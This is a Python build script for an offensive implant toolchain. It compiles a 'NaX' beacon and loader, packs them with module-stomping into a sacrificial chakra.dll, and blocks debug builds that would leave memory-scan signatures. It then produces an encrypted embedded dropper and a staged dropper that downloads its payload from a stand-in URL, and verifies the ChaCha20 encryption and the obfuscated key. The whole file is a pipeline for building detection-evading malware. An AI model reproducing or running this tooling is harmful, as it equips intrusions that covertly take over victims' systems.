#!/usr/bin/env python3
"""
End-to-end build regression for NaX + hostpayload_v2.

Builds:
  1. NaX beacon (src_beacon)
  2. NaX advanced loader (src_loader_adv)
  3. Pack them into bin/nax_adv.x64.bin
  4. Build hostpayload_v2 embedded dropper
  5. Build hostpayload_v2 staged dropper + blob
  6. Verify NaxHeader v2 and dropper crypto roundtrip
  7. Run validate.py on all generated outputs

Usage:
    python3 scripts/build_all.py
"""

import argparse
import os
import shutil
import struct
import subprocess
import sys
import tempfile
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
NAX = ROOT / "NaX"
BEACON = NAX / "src_beacon"
LOADER = NAX / "src_loader_adv"
PAYLOAD = ROOT / "hostpayload_v2"


def run(cmd: list[str], cwd: Path, desc: str) -> None:
    print(f"[+] {desc}")
    subprocess.run(cmd, cwd=cwd, check=True)


def build_beacon() -> None:
    run(["make", "clean"], BEACON, "clean beacon")
    run(["make"], BEACON, "build beacon")


def build_loader() -> None:
    run(["make", "clean"], LOADER, "clean loader")
    run(["make"], LOADER, "build loader")


def pack_nax() -> None:
    build = BEACON / "build/http"
    loader_bin = LOADER / "bin/nax_adv_loader.x64.bin"
    beacon_bin = build / "beacon.x64.bin"
    pdata_bin = build / "beacon.pdata.bin"
    xdata_bin = build / "beacon.xdata.bin"
    rva_file = build / "beacon.text_rva"
    output = LOADER / "bin/nax_adv.x64.bin"

    run([
        "python3", "scripts/pack.py",
        "--loader", str(loader_bin),
        "--beacon", str(beacon_bin),
        "--pdata", str(pdata_bin),
        "--xdata", str(xdata_bin),
        "--text-rva", str(rva_file),
        "--module-stomp",
        "--stomp-pdata",
        "--stomp-dll", "chakra.dll",
        "--output", str(output),
    ], LOADER, "pack nax_adv.x64.bin")


def gate_sleepmask() -> None:
    """Merge-blocking gate: the embedded sleepmask .o must be a release build.

    A debug .o (make -C src_sleepmask debug) carries `[sleepmask]`/`[spoof]`
    printf strings and an MSVCRT$printf import that get stomped into the
    sacrificial DLL's .text for the whole process life — a cheap memory-scan
    signature.  This fails the build until the release variant is embedded.
    """
    bof = NAX / "src_sleepmask/dist/sleepmask.x64.o"
    if not bof.exists():
        raise RuntimeError(f"sleepmask BOF missing: {bof} (make -C src_sleepmask all)")
    debug_markers = [b"[sleepmask]", b"[spoof]", b"MSVCRT$printf"]
    hits = [m.decode() for m in debug_markers if m in bof.read_bytes()]
    if hits:
        raise RuntimeError(
            f"debug-variant sleepmask embedded ({hits}) — "
            f"run `make -C {NAX}/src_sleepmask all` then `python3 {NAX}/scripts/embed_sleepmask.py`"
        )
    print(f"[+] sleepmask gate ok: {bof} clean ({bof.stat().st_size} bytes, release)")


def verify_nax_header() -> None:
    path = LOADER / "bin/nax_adv.x64.bin"
    data = path.read_bytes()
    magic_off = None
    for off in range(0, len(data) - 4, 16):
        if struct.unpack_from("<I", data, off)[0] == 0x4E415832:
            magic_off = off
            break
    if magic_off is None:
        raise RuntimeError("NAX2 magic not found")
    hdr = struct.unpack_from("<IIIIII", data, magic_off)
    total = magic_off + 160 + hdr[1] + hdr[2] + hdr[3]
    if total != len(data):
        raise RuntimeError(f"header total mismatch: {total} != {len(data)}")
    print(f"[+] nax header ok: loader={magic_off} beacon={hdr[1]} pdata={hdr[2]} xdata={hdr[3]} flags=0x{hdr[5]:04x}")


def build_droppers() -> None:
    nax_bin = LOADER / "bin/nax_adv.x64.bin"
    out_embed = PAYLOAD / "build/dropper_embed.exe"
    out_staged = PAYLOAD / "build/dropper_staged.exe"

    run([
        "python3", "pack.py",
        "--payload", str(nax_bin),
        "--output", str(out_embed),
    ], PAYLOAD, "build embedded dropper")

    run([
        "python3", "pack.py",
        "--payload", str(nax_bin),
        "--url", "https://cdn.example.com/loader.bin",
        "--output", str(out_staged),
        "--blob",
        "--keep-source",
    ], PAYLOAD, "build staged dropper")


def verify_dropper_crypto() -> None:
    sys.path.insert(0, str(PAYLOAD))
    from pack import encrypt_payload
    from Crypto.Cipher import ChaCha20

    src_path = PAYLOAD / "build/dropper_embed.c"
    if not src_path.exists():
        # regenerate with --keep-source for verification
        nax_bin = LOADER / "bin/nax_adv.x64.bin"
        subprocess.run([
            "python3", "pack.py",
            "--payload", str(nax_bin),
            "--output", str(src_path),
            "--format", "c",
            "--keep-source",
        ], cwd=PAYLOAD, check=True)

    src = src_path.read_text()
    import re
    obf = int(re.search(r'static const BYTE OBF_BYTE[^=]+=\s*(0x[0-9a-fA-F]+);', src).group(1), 16)
    key = bytes(int(x, 16) ^ obf for x in re.search(r'static const BYTE EKEY\[(\d+)\][^=]+=\s*\{([^}]+)\};', src).group(2).split(",") if x.strip())
    nonce = bytes(int(x, 16) for x in re.search(r'static const BYTE NONCE\[(\d+)\][^=]+=\s*\{([^}]+)\};', src).group(2).split(",") if x.strip())
    hmac_arr = bytes(int(x, 16) for x in re.search(r'static const BYTE HMAC\[(\d+)\][^=]+=\s*\{([^}]+)\};', src).group(2).split(",") if x.strip())
    payload_arr = bytes(int(x, 16) for x in re.search(r'static const BYTE PAYLOAD\[(\d+)\][^=]+=\s*\{([^}]+)\};', src).group(2).split(",") if x.strip())

    import hmac as hmac_mod
    import hashlib
    expected_hmac = hmac_mod.new(key, payload_arr, hashlib.sha256).digest()
    if expected_hmac != hmac_arr:
        raise RuntimeError("HMAC mismatch in embedded dropper")

    plaintext = ChaCha20.new(key=key, nonce=nonce).decrypt(payload_arr)
    if plaintext != nax_bin.read_bytes():
        raise RuntimeError("embedded payload does not decrypt to nax_adv.x64.bin")

    print(f"[+] embedded dropper crypto ok: payload={len(payload_arr)} bytes, decrypts to {len(plaintext)} bytes")


def validate_outputs() -> None:
    files = [
        PAYLOAD / "build/dropper_embed.exe",
        PAYLOAD / "build/dropper_staged.exe",
        PAYLOAD / "build/dropper_embed.c",
        PAYLOAD / "build/dropper_staged.c",
    ]
    for f in files:
        run(["python3", "scripts/validate.py", str(f)], PAYLOAD, f"validate {f.name}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--skip-beacon", action="store_true", help="skip beacon build (use existing)")
    parser.add_argument("--skip-loader", action="store_true", help="skip loader build (use existing)")
    args = parser.parse_args()

    PAYLOAD.mkdir(parents=True, exist_ok=True)

    try:
        if not args.skip_beacon:
            build_beacon()
        gate_sleepmask()
        if not args.skip_loader:
            build_loader()
        pack_nax()
        verify_nax_header()
        build_droppers()
        verify_dropper_crypto()
        validate_outputs()
    except subprocess.CalledProcessError as e:
        print(f"[!] build failed: {e}", file=sys.stderr)
        return 1
    except RuntimeError as e:
        print(f"[!] verification failed: {e}", file=sys.stderr)
        return 1

    print("[+] all builds and checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
